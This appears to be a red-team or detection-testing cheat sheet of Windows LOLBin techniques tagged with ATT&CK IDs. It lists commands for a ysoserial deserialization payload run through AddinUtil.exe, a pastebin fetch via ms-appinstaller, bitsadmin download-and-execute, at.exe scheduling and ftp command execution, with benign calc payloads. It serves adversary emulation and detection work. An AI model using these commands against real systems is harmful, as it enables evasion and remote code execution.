### T1218 - AddinUtil.exe
```cmd
ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c calc.exe -o raw > Addins.store
```
```powershell
$filePath = "C:\Users\hieun\Desktop\tmp\Addins.store"
$existingContent = Get-Content -Path $filePath -Encoding Byte
$modifiedContent = [byte[]](0)*12 + $existingContent
$modifiedContent | Set-Content -Path $filePath -Encoding Byte -NoNewline
```
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\AddInUtil.exe -AddinRoot:C:\Users\hieun\Desktop\tmp\
```

### T1105 - AppInstaller.exe
```cmd
start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw
```

### T1053.002 - At.exe
```cmd
at 14:44 /interactive cmd /c notepad.exe
at \\127.0.0.1 14:44 cmd /c \\127.0.0.1\share\test.exe
```

### T1197 / T1105 - Bitsadmin.exe
```cmd
bitsadmin /create AtomicBITS
bitsadmin /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %TEMP%\bits-test.txt
bitsadmin /setnotifycmdline AtomicBITS %COMSPEC% "cmd /c calc.exe"
bitsadmin /resume AtomicBITS
```
```powershell
Invoke-AtomicTest T1197 -TestNumbers 3
```

### T1105 - CertReq.exe
```powershell
Invoke-AtomicTest T1105 -TestNumbers 25
```

### T1105 / T1140 - CertUtil.exe
```powershell
Invoke-AtomicTest T1105 -TestNumbers 7
Invoke-AtomicTest T1105 -TestNumbers 8
Invoke-AtomicTest T1140 -TestNumbers 1
```

### T1202 / T1105 - Ftp.exe
```cmd
echo !cmd /c c:\windows\system32\calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt
```

### T1218.001 / T1105 - Hh.exe
```powershell
Invoke-AtomicTest T1218.001 -TestNumbers 2
```
